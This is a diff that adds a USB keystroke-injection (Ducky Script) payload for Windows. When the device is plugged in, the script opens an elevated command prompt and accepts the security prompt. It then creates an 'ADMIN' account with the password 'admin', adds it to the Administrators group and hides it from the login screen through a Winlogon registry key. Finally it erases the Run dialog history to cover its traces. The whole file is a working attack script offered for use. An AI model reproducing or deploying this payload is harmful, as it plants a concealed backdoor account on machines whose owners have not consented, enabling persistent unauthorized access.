@@ -1,0 +1,39 @@
+REM this script adds a hidden admin account on a windows PC
+
+DEFAULTCHARDELAY 20
+
+GUI r
+DELAY 400
+
+STRING powershell Start-Process cmd -Verb runAs
+DELAY 200
+ENTER
+DELAY 3000
+REM bypassing security dialog
+ALT y
+DELAY 1000
+REM adding user usename = ADMIN password is admin 
+STRING net user /add ADMIN admin
+DELAY 400
+ENTER
+REM Adding user in administrators group
+STRING net localgroup administrators ADMIN /add
+DELAY 400
+ENTER
+REM Hiding the user via editing registory
+STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+DELAY 400
+ENTER
+
+STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v ADMIN /t REG_DWORD /d 0
+DELAY 400
+ENTER
+
+REM removing the footprints.
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+DELAY 400
+ENTER
+REM Safe exiting
+STRING exit
+DELAY 400
+ENTER
